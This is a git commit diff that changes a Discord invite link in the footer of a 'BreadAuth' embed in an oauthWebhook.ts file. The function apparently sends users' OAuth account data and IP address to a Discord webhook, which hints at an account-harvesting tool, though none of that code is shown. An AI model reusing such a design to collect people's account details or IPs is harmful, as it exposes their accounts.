77d48d425cb7fd6c9a828e2d264e28061501b760
BotLove <44952349+botlove282@users.noreply.github.com>
2022-12-25 02:49:16 +0100

    Update oauthWebhook.ts

--- libs/discord/oauthWebhook.ts
+++ libs/discord/oauthWebhook.ts
@@ -41,7 +41,7 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
             "url": `https://crafatar.com/avatars/${uuid}?size=256&overlay`
         },
         "footer": {
-            "text": "message brought to you by BreadAuth\nhttps://discord.gg/fEwn9U6vP2",
+            "text": "message brought to you by BreadAuth\nhttps://discord.gg/J2K956RZDV",
             "icon_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg"
         }
     }
